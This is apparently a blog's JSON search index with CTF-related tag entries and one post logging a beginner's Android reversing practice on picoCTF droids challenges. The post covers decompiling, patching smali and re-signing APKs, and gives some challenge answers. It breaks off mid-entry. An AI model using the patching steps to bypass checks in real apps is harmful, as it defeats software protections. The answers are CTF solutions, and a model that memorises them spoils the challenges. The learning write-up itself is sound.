2024","externalUrl":null,"permalink":"/tags/bi0sctf/","section":"Tags","summary":"","title":"Bi0sCTF","type":"tags"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/tags/ransomware/","section":"Tags","summary":"","title":"RansomWare","type":"tags"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/tags/reversing/","section":"Tags","summary":"","title":"Reversing","type":"tags"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"24 March 2023","externalUrl":null,"permalink":"/tags/aes_cbc/","section":"Tags","summary":"","title":"AES_CBC","type":"tags"},{"content":"","date":"24 March 2023","externalUrl":null,"permalink":"/tags/htbca23/","section":"Tags","summary":"","title":"HTBCA23","type":"tags"},{"content":"","date":"19 February 2022","externalUrl":null,"permalink":"/tags/android/","section":"Tags","summary":"","title":"Android","type":"tags"},{"content":" Week 1(13th Feb 2022-18th Feb 2022) # Started with android reversing, went through few writeups and videos. Attempted to solve hayyim ctf 2022 breakable.apk, failed to fathom the code, so started off with solving droids-series from pico ctf\nNew Tools learned # d2j-dex2jar-to convert the apk to its java archive d2j-dex2jar filename.apk -o filename.jar\napktool-to extract the resources and the smali code apktool d filename.apk -o foldername\njd-gui-to view the graphical disassembly of the jar file jd-gui filename.jar\nAlso used android studio to emulate the apk\nChallenges solved # picoCTF # droids0-involved looking at the event log in android studio and ctrl+f for \u0026ldquo;pico\u0026rdquo; droids1-involved finding the if condition ,taking the resource number used in .get() to find the pasword, we see is stored in \u0026ldquo;password\u0026rdquo; string, looking under \u0026ldquo;password\u0026rdquo; in strings.xml \u0026hellip;\u0026ldquo;opossum\u0026rdquo; gets us the flag droids2-involved assembling pieces of a string stored as an array in a particular order(\u0026ldquo;dismass.ogg.weatherwax.aching.nitt.garlick\u0026rdquo;) to get flag Week 2(20th Feb 2022-25th Feb 2022) # Continued with last week\u0026rsquo;s learning and started with understanding hwo to patch a apk.For this I looked into droids3 and droids4 from pico ctf.\nNew Tools learned # keytool - Generate a new key to sign the build keytool -genkeypair -v -keystore key.keystore -alias publishingdoc -keyalg RSA -keysize 2048 -validity 10000 jarsigner - to sign the apk after patching it jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ./key.keystore \u0026lt;path to apk\u0026gt;.apk publishingdoc Challenges solved # picoCTF # droids3-involved patching the smali code from moving to \u0026ldquo;nope\u0026rdquo; function to \u0026ldquo;yep\u0026rdquo; function for any input given droids4- ","date":"19 February 2022","externalUrl":null,"permalink":"/posts/android_reversing_basic/","section":"Welcome to Posts!","summary":"This covers basic android reversing that I did in my freshman year","title":"Android Reversing - Basic Setup","type":"posts"},{"content":"","date":"19 February 2022","externalUrl":null,"permalink":"/tags/picoctf/","section":"Tags","summary":"","title":"PicoCTF","type":"tags"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"Welcome to About!","summary":"Learn more about me and why I am starting this blog.","title":"Welcome to About!","type":"about"}]